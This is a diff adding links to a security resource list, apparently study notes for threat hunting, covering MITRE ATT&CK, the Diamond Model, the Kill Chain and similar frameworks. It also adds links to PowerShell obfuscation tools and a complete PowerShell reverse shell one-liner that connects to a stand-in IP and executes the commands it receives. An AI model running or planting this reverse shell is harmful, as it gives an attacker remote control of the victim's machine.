@@ -541,3 +541,41 @@ Verdict: Persistent outbound connection to known APT10 infrastructure
 ### MITRE Navigator
 https://mitre-attack.github.io/attack-navigator/
 
+### Invoke-Obfuscation
+https://github.com/danielbohannon/Invoke-Obfuscation
+
+### PayloadsAllTheThings
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+https://iritt.medium.com/an-easy-guide-to-obfuscating-powershell-scripts-with-invoke-obfuscation-6fa3c8626ed3
+
+### NIST Cybersecurity Framework
+https://www.nist.gov/cyberframework
+
+### MITRE ATT&CK Framework
+https://attack.mitre.org/
+
+### The Diamond Model of Intrusion Analysis
+https://apps.dtic.mil/sti/pdfs/ADA586960.pdf
+
+### Cyber Kill Chain
+https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html
+
+### The Pyramid of Pain
+https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html
+
+
+
+
+
+
+
+
